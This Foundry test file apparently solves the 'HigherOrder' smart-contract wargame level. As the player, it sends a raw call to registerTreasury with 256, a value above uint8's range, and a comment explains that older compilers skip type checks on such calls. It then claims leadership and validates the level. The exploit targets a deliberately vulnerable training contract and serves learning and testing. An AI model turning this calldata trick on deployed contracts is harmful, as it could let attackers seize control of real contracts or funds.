// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {HigherOrder} from "../../src/30/HigherOrder.sol";
import {HigherOrderFactory} from "src/30/HigherOrderFactory.sol";
import {console, Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";


contract HigherOrderTest is Test {
    HigherOrder public instanceContract;
    address payable public instance;

    address public player = address(1);
    address public levelFactory;


    function setUp() external {

        levelFactory = address(new HigherOrderFactory());
        instance = payable(address(HigherOrderFactory(levelFactory).createInstance(player)));
        
    }

    function testLevelCompleted() public {
        vm.startPrank(player);
        // In earlier solidity versions, compilers did not perform type checks when performing low level calls to functions. 256 is not a uint8. But it still passes.
        (bool success, ) = instance.call(abi.encodeWithSelector(HigherOrder.registerTreasury.selector, 256));
        require(success);
        HigherOrder(instance).claimLeadership();
        vm.stopPrank();

        HigherOrderFactory(levelFactory).validateInstance(instance, player);
    }
}
